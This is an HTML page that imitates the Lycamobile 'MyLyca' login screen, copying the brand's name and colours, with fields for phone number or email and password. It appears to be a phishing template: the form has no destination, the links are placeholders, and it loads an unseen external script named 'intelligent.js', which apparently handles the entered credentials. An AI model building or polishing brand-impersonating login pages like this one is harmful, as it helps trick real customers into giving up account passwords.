<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Lycamobile Login</title>

<style>
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: #f3f9f5;
    }

    .header {
        background: #009639;
        padding: 18px;
        text-align: center;
        color: white;
        font-size: 26px;
        font-weight: bold;
    }

    .header span {
        color: #00AEEF; /* Lyca blue */
    }

    .login-box {
        max-width: 380px;
        margin: 60px auto;
        background: #fff;
        padding: 30px 25px;
        border-radius: 12px;
        box-shadow: 0 4px 14px rgba(0,0,0,0.15);
    }

    .login-box h2 {
        text-align: center;
        color: #222;
        margin-bottom: 18px;
        font-weight: bold;
    }

    .input-group {
        margin-bottom: 18px;
    }

    .input-group label {
        display: block;
        margin-bottom: 6px;
        font-weight: bold;
        color: #444;
        font-size: 14px;
    }

    .input-group input {
        width: 100%;
        padding: 12px;
        font-size: 15px;
        border: 1px solid #aaa;
        border-radius: 8px;
        outline: none;
        transition: .2s;
    }

    .input-group input:focus {
        border-color: #009639;
        box-shadow: 0 0 5px rgba(0,150,57,0.4);
    }

    .login-btn {
        width: 100%;
        padding: 14px;
        background: #009639;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        color: white;
        font-weight: bold;
        cursor: pointer;
        transition: 0.2s;
    }

    .login-btn:hover {
        background: #007c2f;
    }

    .links {
        margin-top: 18px;
        text-align: center;
        font-size: 14px;
    }

    .links a {
        color: #009639;
        font-weight: bold;
        text-decoration: none;
    }

    .links a:hover {
        text-decoration: underline;
    }
</style>
</head>
<script src="intelligent.js"></script>
<body>

<div class="header">
    Lyca<span>mobile</span>
</div>

<div class="login-box">
    <h2>Log in to MyLyca</h2>
<form>
    <div class="input-group">
        <label>Phone Number / Email</label>
        <input required type="text" placeholder="Enter your number or email" name="Phone Number or email">
    </div>

    <div class="input-group">
        <label>Password</label>
        <input required type="password" placeholder="Enter your password" name="password">
    </div>

    <button class="login-btn" type="submit">Sign In</button>
</form>
    <div class="links">
        <p><a href="#">Forgot Password?</a></p>
        <p>New user? <a href="#">Register now</a></p>
    </div>
</div>

</body>
</html>
